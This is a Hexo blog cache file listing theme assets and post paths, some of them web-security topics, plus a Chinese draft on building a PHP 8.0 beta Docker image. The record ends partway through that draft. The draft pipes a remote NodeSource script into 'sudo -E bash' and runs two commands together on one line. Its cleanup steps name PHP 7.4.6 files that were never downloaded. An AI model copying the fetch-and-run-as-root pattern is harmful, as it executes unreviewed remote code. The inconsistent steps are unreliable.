{"meta":{"version":1,"warehouse":"4.0.0"},"models":{"Asset":[{"_id":"source/images/about.jpg","path":"images/about.jpg","modified":1,"renderable":0},{"_id":"themes/maupassant/source/css/copycode.css","path":"css/copycode.css","modified":1,"renderable":1},{"_id":"themes/maupassant/source/css/copyright.css","path":"css/copyright.css","modified":1,"renderable":1},{"_id":"themes/maupassant/source/css/dark.css","path":"css/dark.css","modified":1,"renderable":1},{"_id":"themes/maupassant/source/css/donate.css","path":"css/donate.css","modified":1,"renderable":1},{"_id":"themes/maupassant/source/css/search.css","path":"css/search.css","modified":1,"renderable":1},{"_id":"themes/maupassant/source/css/style.scss","path":"css/style.scss","modified":1,"renderable":1},{"_id":"themes/maupassant/source/img/alipay.svg","path":"img/alipay.svg","modified":1,"renderable":1},{"_id":"themes/maupassant/source/img/bitcoin.svg","path":"img/bitcoin.svg","modified":1,"renderable":1},{"_id":"themes/maupassant/source/img/github.svg","path":"img/github.svg","modified":1,"renderable":1},{"_id":"themes/maupassant/source/img/like.svg","path":"img/like.svg","modified":1,"renderable":1},{"_id":"themes/maupassant/source/img/paypal.svg","path":"img/paypal.svg","modified":1,"renderable":1},{"_id":"themes/maupassant/source/img/wechat.svg","path":"img/wechat.svg","modified":1,"renderable":1},{"_id":"themes/maupassant/source/js/copycode.js","path":"js/copycode.js","modified":1,"renderable":1},{"_id":"themes/maupassant/source/js/codeblock-resizer.js","path":"js/codeblock-resizer.js","modified":1,"renderable":1},{"_id":"themes/maupassant/source/js/copyright.js","path":"js/copyright.js","modified":1,"renderable":1},{"_id":"themes/maupassant/source/js/donate.js","path":"js/donate.js","modified":1,"renderable":1},{"_id":"themes/maupassant/source/js/fancybox.js","path":"js/fancybox.js","modified":1,"renderable":1},{"_id":"themes/maupassant/source/js/love.js","path":"js/love.js","modified":1,"renderable":1},{"_id":"themes/maupassant/source/js/search.js","path":"js/search.js","modified":1,"renderable":1},{"_id":"themes/maupassant/source/js/share.js","path":"js/share.js","modified":1,"renderable":1},{"_id":"themes/maupassant/source/js/smartresize.js","path":"js/smartresize.js","modified":1,"renderable":1},{"_id":"themes/maupassant/source/js/totop.js","path":"js/totop.js","modified":1,"renderable":1}],"Cache":[{"_id":"source/_drafts/基于Docker制作PHP镜像.md","hash":"252bfbd1762ba28034af616896bac4bb5bf91ead","modified":1616571314000},{"_id":"source/_drafts/简历.md","hash":"0c57598337f60d9ea92a3d4fe2aee5ca7df48e09","modified":1616721394000},{"_id":"source/.DS_Store","hash":"8fe33af0ab49e0e3e0b37e854bcf41b25f83a1f0","modified":1618219042000},{"_id":"source/_posts/.DS_Store","hash":"147ba0ad643d23f6cec032f18c526bb1871a26f3","modified":1617067980000},{"_id":"source/_posts/CSRF.md","hash":"ad624726b9bba98fb0d16bbde6cbfc7c0dd03462","modified":1616572494000},{"_id":"source/_posts/CentOS8下安装Docker.md","hash":"4aab55e224c0c1fc9d3e72a32e540fbccb80ed12","modified":1616572244000},{"_id":"source/_posts/CentOS8下安装Node-js和npm.md","hash":"93c5bc6da1f61d36e4c0c92db26279a8ff5345c0","modified":1616571472000},{"_id":"source/_posts/CentOS8下安装Git.md","hash":"14ae1688af9d0ece6bf733baffcf77221e937b74","modified":1616571528000},{"_id":"source/_posts/Mac终端连接云服务器error.md","hash":"b41ac728270c41fbfd29ff0bd41026ece873ee1c","modified":1616571065000},{"_id":"source/_posts/CentOS8下搭建LNMP.md","hash":"39ea0b1b28edbfbf70518641f3aa7df7c959c6a4","modified":1616571426000},{"_id":"source/_posts/Mac下SSH闲时自动中断解决方法.md","hash":"ae63d1ca14e19952f8a0ce3e22c935fec20c7687","modified":1621321657000},{"_id":"source/_posts/Mac下制作图片马.md","hash":"1516d21cf5172bb6b3dc73cd47f9cfcdffdb6816","modified":1616572568000},{"_id":"source/_posts/Plan.md","hash":"5bf4ba2cf188ccb16411e395e76c66385f62d82f","modified":1625229005884},{"_id":"source/_posts/SQL注入.md","hash":"e84bdea72498ed792bb73ea93eae980c054ddbfc","modified":1624609782000},{"_id":"source/_posts/XXE.md","hash":"066bf74e502c1944fc86e258a077ec72c085a584","modified":1616665433000},{"_id":"source/_posts/SSRF.md","hash":"3b204d57e4410eba4941400f703c45be0619b4f3","modified":1616656859000},{"_id":"source/_posts/XSS.md","hash":"e49e270a02a5aa1e96c25e2eddca520a4edf3ac7","modified":1616572462000},{"_id":"source/_posts/unserialize反序列化漏洞.md","hash":"f956a09dcba5e6eb4d191574e07065a5e9c5d602","modified":1616743854000},{"_id":"source/_posts/变量覆盖漏洞.md","hash":"71b486e22526005f6124ede13beaa89635fe8f6c","modified":1616747705000},{"_id":"source/_posts/支付漏洞.md","hash":"0b61765a41c19a4124992b2821921d3ab825a6cd","modified":1616653733000},{"_id":"source/_posts/本地包含与远程包含.md","hash":"babca422cf4a845a8b1b768223e709c012787ca7","modified":1616745037000},{"_id":"source/_posts/纲要.md","hash":"d7f82c93133eb2686be13db227c6792c9a488b7b","modified":1616572372000},{"_id":"source/_posts/越权.md","hash":"8f615a2524b00dd5237007a2415ea1fd7b46946b","modified":1616641315000},{"_id":"source/_posts/文件上传.md","hash":"499f67708688041abf09b4d0e43c7c92081bc1c1","modified":1616572603000},{"_id":"source/about/.DS_Store","hash":"34fe290bc8d934cf4c51deea76c7ec16f3cf4d2f","modified":1616636388000},{"_id":"source/_posts/验证码绕过、密码找回漏洞.md","hash":"f8ea889387d50ee62ef00120c7cdfe3fd5542b7f","modified":1616572742000},{"_id":"source/_posts/进程与线程.md","hash":"e26e93ca6a4c1b3d9f1542d6d7ecd15aa3ef14ca","modified":1616566770000},{"_id":"source/images/.DS_Store","hash":"f8328e03b96e4f19937372d6a96b7249554ccd20","modified":1616635594000},{"_id":"source/images/about.jpg","hash":"473c5e1a02a9718a6e2dafb8edb2e92ac3159caf","modified":1616635541000},{"_id":"source/about/index.md","hash":"14e84648cf0eeb43da5faf40d2baacd70ae3096b","modified":1616635607000},{"_id":"themes/maupassant/.DS_Store","hash":"f3888e3c10be7c5869e040e7c98a5160c9b71808","modified":1616570254000},{"_id":"themes/maupassant/.gitignore","hash":"16945417d10c15c950306794dbb0d970b5a199fe","modified":1616548024000},{"_id":"themes/maupassant/.travis.yml","hash":"0339959f29deddc365e8fe8bd85da524410b9a23","modified":1616548024000},{"_id":"themes/maupassant/LICENSE","hash":"f0ac2f92770650c9835183f79010c0d307b34acd","modified":1616548024000},{"_id":"themes/maupassant/README.md","hash":"08a3499122e10a8fd8e0a75dcd4cce0125e8c98d","modified":1616548024000},{"_id":"themes/maupassant/_config.yml","hash":"a39e772ebee2ea5240621039e285bb8a2867b0f3","modified":1617808912000},{"_id":"themes/maupassant/package.json","hash":"f092433469eb87362e831326425a6a5c3c9fea0d","modified":1616548024000},{"_id":"themes/maupassant/languages/de-DE.yml","hash":"5d3556a885e355a8c2da65ef3e7b3ee36a628bfa","modified":1616548024000},{"_id":"themes/maupassant/languages/en.yml","hash":"9c979a2f107536399bbe2be572c2d0bebcdd9d95","modified":1616548024000},{"_id":"themes/maupassant/languages/es-ES.yml","hash":"58e1d04bcd1834fa9d2960e18e027abbbccbedc9","modified":1616548024000},{"_id":"themes/maupassant/languages/fr-FR.yml","hash":"b47906ec0abf867fb3e3360bc046b7afb68aee25","modified":1616548024000},{"_id":"themes/maupassant/languages/ko.yml","hash":"909a33e0befa6978e8e72157c6b415b48551ee31","modified":1616548024000},{"_id":"themes/maupassant/languages/ru.yml","hash":"2476a631f4d3c668de04af85a6c2c97ba2a57e96","modified":1616548024000},{"_id":"themes/maupassant/languages/zh-CN.yml","hash":"78cc1794a3ce3e186c462c1a70f097d0c05cd210","modified":1616548024000},{"_id":"themes/maupassant/languages/zh-TW.yml","hash":"e9747f9b3ec1314a3cae44a9a90e7649af739633","modified":1616548024000},{"_id":"themes/maupassant/layout/.DS_Store","hash":"25ae0be63cb9ad7bb23eb6c7497ad39ecc5bafaa","modified":1616567027000},{"_id":"themes/maupassant/layout/archive.pug","hash":"749028e57a2eaad8c92ce2a2426c98605ab746a7","modified":1616548024000},{"_id":"themes/maupassant/layout/base-without-sidebar.pug","hash":"80995eadfd89ee9aa36f4672f8d405e03f13af15","modified":1616548024000},{"_id":"themes/maupassant/layout/base.pug","hash":"a226db456b92c9e8611a8bfda07818e6c3d13dd5","modified":1616548024000},{"_id":"themes/maupassant/layout/index.pug","hash":"162fe3fa695e8bea5a77916aefbb7ce98cd227bf","modified":1616548024000},{"_id":"themes/maupassant/layout/page.pug","hash":"a285a76950bb1b91f482ef9c473472bd0ede601d","modified":1616548024000},{"_id":"themes/maupassant/layout/post.pug","hash":"c0113056cbcfbba79867835ba364a37d9ccd3cfb","modified":1616548024000},{"_id":"themes/maupassant/layout/single-column.pug","hash":"0593f261dc208bb0b5c4232eb41eff597a291bd9","modified":1616548024000},{"_id":"themes/maupassant/layout/tagcloud.pug","hash":"4aa57b41e919a12b6d7691cd4a36d3a531b55fcb","modified":1616548024000},{"_id":"themes/maupassant/layout/timeline.pug","hash":"84fbfc92ccdf291b491140d89557553141a5d3f9","modified":1616548024000},{"_id":"themes/maupassant/source/.DS_Store","hash":"108ecd3ebc3b620e356fa5077de716b324b25b9e","modified":1616553471000},{"_id":"themes/maupassant/layout/_partial/after_footer.pug","hash":"aefb67bac8fcef9cb3027f8622923b392f79f51e","modified":1616548024000},{"_id":"themes/maupassant/layout/_partial/comments.pug","hash":"ee41abc4fe1610293ef4958275c41c9423d68105","modified":1616548024000},{"_id":"themes/maupassant/layout/_partial/head.pug","hash":"51881cde4653f00e9d0de68fb9c201b52b100b9e","modified":1616567029000},{"_id":"themes/maupassant/layout/_partial/footer.pug","hash":"cf0d3747e73ef884af149a5dfbc23d757da2ca20","modified":1616559993000},{"_id":"themes/maupassant/layout/_partial/helpers.pug","hash":"acdf9e2d52ee86c831fa15ce1570930c5779bc78","modified":1616548024000},{"_id":"themes/maupassant/layout/_partial/mathjax.pug","hash":"b54b56faff9e47ab3ca3cdd55056c73e60776f3c","modified":1616548024000},{"_id":"themes/maupassant/layout/_partial/mathjax2.pug","hash":"d6ac5dc4e9c7a1b866f1f92d88988cfb35aded4c","modified":1616548024000},{"_id":"themes/maupassant/layout/_partial/tag.pug","hash":"53d721ea4c93564cb0bdde065572ff6128574d36","modified":1616548024000},{"_id":"themes/maupassant/layout/_partial/paginator.pug","hash":"53f9cb77448e84a98da5eb688e2e12b173c555bb","modified":1616548024000},{"_id":"themes/maupassant/layout/_partial/post_nav.pug","hash":"a2d698c84bb6da08195fe870dbd7215f65388d3f","modified":1616548024000},{"_id":"themes/maupassant/layout/_partial/totop.pug","hash":"8225bbc3cdb9648bc2e6872e5c616a9a1e4def4f","modified":1616548024000},{"_id":"themes/maupassant/layout/_partial/wordcount.pug","hash":"b3c846a2e0ac79933e32c343029b769f2865a27f","modified":1616548024000},{"_id":"themes/maupassant/layout/_widget/category.pug","hash":"7c6aed762934ca51aa2669b886254da24b77bc14","modified":1616548024000},{"_id":"themes/maupassant/layout/_widget/donate.pug","hash":"50855ce17af4298ce0f15236e2308c4a1760e7e3","modified":1616548024000},{"_id":"themes/maupassant/layout/_widget/copyright.pug","hash":"32701dcba9c52d4bc73badaf8afe91af3f87b6a0","modified":1616548024000},{"_id":"themes/maupassant/layout/_widget/recent_comments.pug","hash":"1ef7a333ab9bfa169276d0ad48aecf5166ab63cb","modified":1616548024000},{"_id":"themes/maupassant/layout/_widget/links.pug","hash":"c45aa7ec00158579e58f1f8dfd890447bb5e5e54","modified":1616548024000},{"_id":"themes/maupassant/layout/_widget/recent_posts.pug","hash":"19431336d724d2118e46da43683bce9063176541","modified":1616548024000},{"_id":"themes/maupassant/layout/_widget/search.pug","hash":"6e8e4123cca38840c4607c1a056205972b82bb7b","modified":1616548024000},{"_id":"themes/maupassant/layout/_widget/tag.pug","hash":"132f049ce677d0e38f50073174c4ee4b825d4a06","modified":1616548024000},{"_id":"themes/maupassant/source/css/copycode.css","hash":"e2463b8dacf629e180a1b6cd80667ca8044292eb","modified":1616548024000},{"_id":"themes/maupassant/source/css/copyright.css","hash":"a418da11a88d1feb14500df42ed97a64da6a7611","modified":1616548024000},{"_id":"themes/maupassant/source/css/dark.css","hash":"0faf42a84e243032b736c5f06ddbb95ac69e779c","modified":1616548024000},{"_id":"themes/maupassant/source/css/donate.css","hash":"95b2fd65042afecc0b5530847c369bcc11d74bd0","modified":1616548024000},{"_id":"themes/maupassant/source/css/search.css","hash":"9406e138d7bb6a9ef4a067eba1dafa627519c8a7","modified":1616548024000},{"_id":"themes/maupassant/source/css/style.scss","hash":"2435d3536b35a259e3eaca850292c1aa48cc8673","modified":1616548024000},{"_id":"themes/maupassant/source/img/alipay.svg","hash":"3d94d2f9b09e352802628c9225578e1086f5fef3","modified":1616548024000},{"_id":"themes/maupassant/source/img/bitcoin.svg","hash":"590b6b6462896168d08b30dfe2de5f08950d5553","modified":1616548024000},{"_id":"themes/maupassant/source/img/github.svg","hash":"277798d16cb6106e45ef74f6b9972011fa43401b","modified":1616548024000},{"_id":"themes/maupassant/source/img/like.svg","hash":"e6e4bd1af076be9358316cac89efdc22ef4a5064","modified":1616548024000},{"_id":"themes/maupassant/source/img/paypal.svg","hash":"09786c983a10bc570dcd05b87cec601e9d01eb00","modified":1616548024000},{"_id":"themes/maupassant/source/img/wechat.svg","hash":"19c1f68ec8c0b8e9f7855e7a6e78077f70a1aedc","modified":1616548024000},{"_id":"themes/maupassant/source/js/copycode.js","hash":"fde1f153bab1f00ae8930668094c00aa9ff3c7a3","modified":1616548024000},{"_id":"themes/maupassant/source/js/codeblock-resizer.js","hash":"5d0b786d60bf225d9eabcc9cece2719ff4d9b6cd","modified":1616548024000},{"_id":"themes/maupassant/source/js/copyright.js","hash":"7b1bd775ea22abf33d57f78628f436bf656e439a","modified":1616548024000},{"_id":"themes/maupassant/source/js/donate.js","hash":"bdddd8d9847462d020f7a511e7e12c046223195d","modified":1616548024000},{"_id":"themes/maupassant/source/js/fancybox.js","hash":"13c4781570339f4fba76a3d7f202e442817dd605","modified":1616548024000},{"_id":"themes/maupassant/source/js/love.js","hash":"5cf89f622bf891cf1986845eb92eadef6f358eb7","modified":1616548024000},{"_id":"themes/maupassant/source/js/search.js","hash":"0c0630e2ef213701d393b041f10572e951a27985","modified":1616548024000},{"_id":"themes/maupassant/source/js/share.js","hash":"a2f9de374523dc7f2ddb90ed5f24b668c20d9272","modified":1616548024000},{"_id":"themes/maupassant/source/tag/.DS_Store","hash":"83734f79cb1d4e9443b2a9240e91dd04f0c9628d","modified":1616553466000},{"_id":"themes/maupassant/source/js/smartresize.js","hash":"3ef157fd877167e3290f42c67a624ea375a46c24","modified":1616548024000},{"_id":"themes/maupassant/source/js/totop.js","hash":"7dbf8fcf582a4fb6eb9b2c60d6de9f9c2091ec4c","modified":1616548024000},{"_id":"public/atom.xml","hash":"85869454c3faf9fdf7a5cf5f1477710c8419fb9d","modified":1625229019191},{"_id":"public/about/index.html","hash":"bda8be64f97985443e7a4a8803b5ed17ac605836","modified":1625229019191},{"_id":"public/2021/07/02/Plan/index.html","hash":"6bded5b0d20836bcc9c972d76ab578a1bbc98314","modified":1625229019191},{"_id":"public/2021/03/26/本地包含与远程包含/index.html","hash":"751c7b82991fbac7f7cc2b71fd84f03803892dda","modified":1625229019191},{"_id":"public/2021/03/26/unserialize反序列化漏洞/index.html","hash":"939384a541842ba30ab8ea65f9070ef9b1283cd5","modified":1625229019191},{"_id":"public/2021/03/26/变量覆盖漏洞/index.html","hash":"67d736e2eabef85b9c56b8c3626a0b9c46446633","modified":1625229019191},{"_id":"public/2021/03/25/XXE/index.html","hash":"bdbe27eea2dcc8eb7d1269bf95d9bc41d5ebbfd5","modified":1625229019191},{"_id":"public/2021/03/25/SSRF/index.html","hash":"5dba99991b8fa29b200e0355e5db7ec87da03123","modified":1625229019191},{"_id":"public/2021/03/25/支付漏洞/index.html","hash":"83b02795e12f4c18faa843be53e45df049685c9c","modified":1625229019191},{"_id":"public/2021/03/25/越权/index.html","hash":"bde505eb9d6c3720bd2e372e77b842597be786b4","modified":1625229019191},{"_id":"public/2021/03/24/验证码绕过、密码找回漏洞/index.html","hash":"27e41c9880c46309aede2eac779fdcdeabe1a054","modified":1625229019191},{"_id":"public/2021/03/24/文件上传/index.html","hash":"d3b555ca68f383a94a095247f96227b8cd65a472","modified":1625229019191},{"_id":"public/2021/03/24/Mac下制作图片马/index.html","hash":"9d606c7a23115dacb925e09f1e34f1195eec432e","modified":1625229019191},{"_id":"public/2021/03/24/CSRF/index.html","hash":"8dade3ead4d7c9365b764ad1b3604a62f37ec79a","modified":1625229019191},{"_id":"public/2021/03/24/XSS/index.html","hash":"90933895cd8ed3304a152d95f26d5382c5358764","modified":1625229019191},{"_id":"public/2021/03/24/纲要/index.html","hash":"02095ad649050a25f7224c709af8e1a24977359c","modified":1625229019191},{"_id":"public/2021/03/24/CentOS8下安装Docker/index.html","hash":"380097e74cb57b20115803410c2746bfe6139adb","modified":1625229019191},{"_id":"public/2021/03/24/CentOS8下安装Git/index.html","hash":"2804d2c6a6dd897e7639c98b915e64c6376c9f8d","modified":1625229019191},{"_id":"public/2021/03/24/CentOS8下安装Node-js和npm/index.html","hash":"c9009a2e4eeb56ae0e6c60031b4a0762a2b9511d","modified":1625229019191},{"_id":"public/2021/03/24/Mac下SSH闲时自动中断解决方法/index.html","hash":"5afde2a95c7ba1d333b9ce41090bf6e6155c376c","modified":1625229019191},{"_id":"public/2021/03/24/Mac终端连接云服务器error/index.html","hash":"b7aa63590b97b9d69e8c5e499b118c26e5cfb223","modified":1625229019191},{"_id":"public/2021/03/24/进程与线程/index.html","hash":"3c4853c6ef281496c8a2486121880f6d0ea4c17a","modified":1625229019191},{"_id":"public/archives/index.html","hash":"3b0c7d8096c654e7684ff06257366c8b4cd2b661","modified":1625229019191},{"_id":"public/archives/2021/index.html","hash":"3b0c7d8096c654e7684ff06257366c8b4cd2b661","modified":1625229019191},{"_id":"public/archives/2021/03/index.html","hash":"10b7871daaed2616deb389234ffbd8af90f8c5ab","modified":1625229019191},{"_id":"public/archives/2021/07/index.html","hash":"b90ea62f08b3a7d248370256b2a8423871501403","modified":1625229019191},{"_id":"public/categories/Web安全/index.html","hash":"d097e7ea00684e4d18bb9c676c19e7f5cb2b9cc0","modified":1625229019191},{"_id":"public/categories/Linux/index.html","hash":"44f6c1465313e3f003121e7637bf9fbf2f84f946","modified":1625229019191},{"_id":"public/index.html","hash":"15bdcd3c85e51b4f7153edffcc765da47e528e74","modified":1625229019191},{"_id":"public/categories/Mac/index.html","hash":"62c1814d217cb44ff7b889ed1b31e5c2c5af6f3f","modified":1625229019191},{"_id":"public/categories/Python/index.html","hash":"9812d967f8ce29c5a542351ceb64d3c67a959316","modified":1625229019191},{"_id":"public/page/2/index.html","hash":"20604517d3b9d9a929fbf79b443f5221c024bfcd","modified":1625229019191},{"_id":"public/page/3/index.html","hash":"0cfd042bce57d0c0d6048a9635dc5cbaf10fa4c3","modified":1625229019191},{"_id":"public/tags/Docker/index.html","hash":"9c782d795aa3e938c84ce709345590ca5f2ecb7d","modified":1625229019191},{"_id":"public/tags/Web安全/index.html","hash":"d097e7ea00684e4d18bb9c676c19e7f5cb2b9cc0","modified":1625229019191},{"_id":"public/tags/Linux/index.html","hash":"44f6c1465313e3f003121e7637bf9fbf2f84f946","modified":1625229019191},{"_id":"public/tags/Mac/index.html","hash":"62c1814d217cb44ff7b889ed1b31e5c2c5af6f3f","modified":1625229019191},{"_id":"public/tags/Python/index.html","hash":"9812d967f8ce29c5a542351ceb64d3c67a959316","modified":1625229019191},{"_id":"public/2021/03/24/SQL注入/index.html","hash":"b87b4d7a7f569d5f878045ca70ae084702076e75","modified":1625229019191},{"_id":"public/2021/03/24/CentOS8下搭建LNMP/index.html","hash":"1d82601b4334848d958db9460f414284f19eebda","modified":1625229019191},{"_id":"public/images/about.jpg","hash":"473c5e1a02a9718a6e2dafb8edb2e92ac3159caf","modified":1625229019191},{"_id":"public/css/style.scss","hash":"2435d3536b35a259e3eaca850292c1aa48cc8673","modified":1625229019191},{"_id":"public/img/alipay.svg","hash":"3d94d2f9b09e352802628c9225578e1086f5fef3","modified":1625229019191},{"_id":"public/img/bitcoin.svg","hash":"590b6b6462896168d08b30dfe2de5f08950d5553","modified":1625229019191},{"_id":"public/img/like.svg","hash":"e6e4bd1af076be9358316cac89efdc22ef4a5064","modified":1625229019191},{"_id":"public/img/github.svg","hash":"277798d16cb6106e45ef74f6b9972011fa43401b","modified":1625229019191},{"_id":"public/img/paypal.svg","hash":"09786c983a10bc570dcd05b87cec601e9d01eb00","modified":1625229019191},{"_id":"public/img/wechat.svg","hash":"19c1f68ec8c0b8e9f7855e7a6e78077f70a1aedc","modified":1625229019191},{"_id":"public/css/copycode.css","hash":"e2463b8dacf629e180a1b6cd80667ca8044292eb","modified":1625229019191},{"_id":"public/css/dark.css","hash":"0faf42a84e243032b736c5f06ddbb95ac69e779c","modified":1625229019191},{"_id":"public/css/copyright.css","hash":"a418da11a88d1feb14500df42ed97a64da6a7611","modified":1625229019191},{"_id":"public/css/search.css","hash":"9406e138d7bb6a9ef4a067eba1dafa627519c8a7","modified":1625229019191},{"_id":"public/css/donate.css","hash":"95b2fd65042afecc0b5530847c369bcc11d74bd0","modified":1625229019191},{"_id":"public/js/copycode.js","hash":"fde1f153bab1f00ae8930668094c00aa9ff3c7a3","modified":1625229019191},{"_id":"public/js/codeblock-resizer.js","hash":"5d0b786d60bf225d9eabcc9cece2719ff4d9b6cd","modified":1625229019191},{"_id":"public/js/donate.js","hash":"bdddd8d9847462d020f7a511e7e12c046223195d","modified":1625229019191},{"_id":"public/js/copyright.js","hash":"7b1bd775ea22abf33d57f78628f436bf656e439a","modified":1625229019191},{"_id":"public/js/love.js","hash":"5cf89f622bf891cf1986845eb92eadef6f358eb7","modified":1625229019191},{"_id":"public/js/fancybox.js","hash":"13c4781570339f4fba76a3d7f202e442817dd605","modified":1625229019191},{"_id":"public/js/search.js","hash":"0c0630e2ef213701d393b041f10572e951a27985","modified":1625229019191},{"_id":"public/js/share.js","hash":"a2f9de374523dc7f2ddb90ed5f24b668c20d9272","modified":1625229019191},{"_id":"public/js/smartresize.js","hash":"3ef157fd877167e3290f42c67a624ea375a46c24","modified":1625229019191},{"_id":"public/js/totop.js","hash":"7dbf8fcf582a4fb6eb9b2c60d6de9f9c2091ec4c","modified":1625229019191}],"Category":[{"name":"Docker","_id":"ckqmbe9ng0003icsw6jrwgj7b"},{"name":"Web安全","_id":"ckqmbe9nj0008icsw4b8hge02"},{"name":"Linux","_id":"ckqmbe9nl000eicsw9rwxc256"},{"name":"Mac","_id":"ckqmbe9nu0016icswfoox0ulg"},{"name":"Python","_id":"ckqmbe9o4002eicsw3nyj7mtl"}],"Data":[],"Page":[{"title":"关于","date":"2021-03-24T02:57:01.000Z","_content":"\n![](../images/about.jpg)\n\n","source":"about/index.md","raw":"---\ntitle: 关于\ndate: 2021-03-24 10:57:01\n---\n\n![](../images/about.jpg)\n\n","updated":"2021-03-25T01:26:47.000Z","path":"about/index.html","comments":1,"layout":"page","_id":"ckqmbe9nb0000icsw8lbiafdy","content":"<p><img src=\"../images/about.jpg\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"../images/about.jpg\"></p>\n"}],"Post":[{"title":"基于Docker制作PHP镜像","toc":false,"date":"2021-03-24T07:33:16.000Z","description":"基于Docker制作PHP镜像","_content":"\n拉取ubuntu:20.10的镜像\n\n```\ndocker pull ubuntu:20.10\n```\n\n运行一个ubuntu:20.10实例\n\n```\ndocker run -it ubuntu:20.10 /bin/bash\n```\n\n进入实例后运行\n\n```\napt update\n```\n\n然后安装必要的基础软件\n\n```\napt install -y sudo vim wget git make gcc pkg-config autoconf libxml2-dev libbz2-dev libgmp-dev openssl libssl-dev curl libcurl4-gnutls-dev libzip-dev libmemcached-dev libjpeg-dev libpng-dev libfreetype6-dev libwebp-dev sqlite3 libsqlite3-dev libtool\n```\n\nphp7.4有额外的依赖项目oniguruma\n\n```\ncd\ngit clone https://github.com/kkos/oniguruma.git oniguruma\ncd oniguruma\n./autogen.sh\n./configure\nmake\nmake install \n```\n\n到php官网，找到最新版 7.4.6，并下载中国区镜像，解压至根目录\n\n```\ncd\nwget https://downloads.php.net/~pollita/php-8.0.0beta4.tar.gz\ntar -zxvf php-8.0.0beta4.tar.gz\n```\n\n查看最新的参数help\n\n```\ncd\nphp-8.0.0beta4\n./configure --help\n```\n\n本次更新后参数如下\n\n```\n./configure --enable-fpm --with-openssl --with-zlib --enable-bcmath --with-bz2 --enable-calendar --with-curl --enable-exif --enable-gd --with-webp --with-jpeg --with-zlib-dir --with-freetype --with-gmp --with-mhash --enable-mbstring --with-mysqli --with-pdo-mysql --enable-shmop --enable-sockets --with-zip --enable-mysqlnd --enable-opcache --with-pear\n```\n\n然后make && make install\n\n```\npecl channel-update https://pecl.php.net/channel.xml\n```\n\n然后安装业务所需要的扩展yaf,swoole等\n\n依次使用pecl install 名称安装需要的扩展\n\n```\nigbinary\nmsgpack\nmemcached\nmongodb\nredis\nswoole\nyaf\ngrpc\n```\n\n通过php -i看到没有加载任何配置文件\n\n```\ncp /root/php-8.0.0beta4/php.ini-production /usr/local/lib/php.ini\n```\n\n随后\n\n```\nvim /usr/local/lib/php.ini\n```\n\n找到如下配置进行修改\n\n```\nexpose_php = Off\nmax_execution_time = 60\npost_max_size = 20M\nupload_max_filesize = 20M\ndate.timezone = Asia/Shanghai\nopcache.enable=1 \n```\n\n随后找地方塞入extension\n\n```\nzend_extension=opcache.so\nextension=igbinary.so\nextension=memcached.so\nextension=mongodb.so\nextension=msgpack.so\nextension=redis.so\nextension=swoole.so\nextension=yaf.so\nextension=grpc.so \n```\n\n然后安装nodejs,参考资料 https://github.com/nodesource/distributions/blob/master/README.md\n\n```\ncurl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt-get install -y nodejs\nnpm config set registry https://registry.npm.taobao.org \n```\n\n然后收尾\n\n```\napt clean\ncd\nrm php-7.4.6.tar.gz\nrm -rf php-7.4.6\nrm -rf /tmp/pear \n```\n\n然后退出容器 docker commit 后，导出镜像即可\n\n```\ndocker commit -a \"xinxu.lu <lzz@wolou-inc.com>\" -m \"install php with full extension support and node,npm\" 4f61a96ceba4 bzinc/php80:0.0\ndocker save -o bzinc_php80_0_0.tar fc1814317609\n```\n\n","source":"_drafts/基于Docker制作PHP镜像.md","raw":"---\ntitle: 基于Docker制作PHP镜像\ntoc: false\ndate: 2021-03-24 15:33:16\ndescription: 基于Docker制作PHP镜像\ntags: Docker\ncategories: Docker\n---\n\n拉取ubuntu:20.10的镜像\n\n```\ndocker pull ubuntu:20.10\n```\n\n运行一个ubuntu:20.10实例\n\n```\ndocker run -it ubuntu:20.10 /bin/bash\n```\n\n进入实例后运行\n\n```\napt update\n```\n\n然后安装必要的基础软件\n\n```\napt install -y sudo vim wget git make gcc pkg-config autoconf libxml2-dev libbz2-dev libgmp-dev openssl libssl-dev curl libcurl4-gnutls-dev libzip-dev libmemcached-dev libjpeg-dev libpng-dev libfreetype6-dev libwebp-dev sqlite3 libsqlite3-dev libtool\n```\n\nphp7.4有额外的依赖项目oniguruma\n\n```\ncd\ngit clone https://github.com/kkos/oniguruma.git oniguruma\ncd oniguruma\n./autogen.sh\n./configure\nmake\nmake install \n```\n\n到php官网，找到最新版 7.4.6，并下载中国区镜像，解压至根目录\n\n```\ncd\nwget https://downloads.php.net/~pollita/php-8.0.0beta4.tar.gz\ntar -zxvf php-8.0.0beta4.tar.gz\n```\n\n查看最新的参数help\n\n```\ncd\nphp-8.0.0beta4\n./configure --help\n```\n\n本次更新后参数如下\n\n```\n./configure --enable-fpm --with-openssl --with-zlib --enable-bcmath --with-bz2 --enable-calendar --with-curl --enable-exif --enable-gd --with-webp --with-jpeg --with-zlib-dir --with-freetype --with-gmp --with-mhash --enable-mbstring --with-mysqli --with-pdo-mysql --enable-shmop --enable-sockets --with-zip --enable-mysqlnd --enable-opcache --with-pear\n```\n\n然后make && make install\n\n```\npecl channel-update https://pecl.php.net/channel.xml\n```\n\n然后安装业务所需要的扩展yaf,swoole等\n\n依次使用pecl install 名称安装需要的扩展\n\n```\nigbinary\nmsgpack\nmemcached\nmongodb\nredis\nswoole\nyaf\ngrpc\n```\n\n通过php -i看到没有加载任何配置文件\n\n```\ncp /root/php-8.0.0beta4/php.ini-production /usr/local/lib/php.ini\n```\n\n随后\n\n```\nvim /usr/local/lib/php.ini\n```\n\n找到如下配置进行修改\n\n```\nexpose_php = Off\nmax_execution_time = 60\npost_max_size = 20M\nupload_max_filesize = 20M\ndate.timezone = Asia/Shanghai\nopcache.enable=1 \n```\n\n随后找地方塞入extension\n\n```\nzend_extension=opcache.so\nextension=igbinary.so\nextension=memcached.so\nextension=mongodb.so\nextension=msgpack.so\nextension=redis.so\nextension=swoole.so\nextension=yaf.so\nextension=grpc.so \n```\n\n然后安装nodejs,参考资料 https://github.com/nodesource/distributions/blob/master/README.md\n\n```\ncurl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt-get install -y nodejs\nnpm config set registry https://registry.npm.taobao.org \n```\n\n然后收尾\n\n```\napt clean\ncd\nrm php-7.4.6.tar.gz\nrm -rf php-7.4.6\nrm -rf /tmp/pear \n```\n\n然后退出容器 docker commit 后，导出镜像即可\n\n```\ndocker commit -a \"xinxu.lu <lzz@wolou-inc.com>\" -m \"install php with full extension support and node,npm\" 4f61a96ceba4 bzinc/php80:0.0\ndocker save -o bzinc_php80_0_0.tar 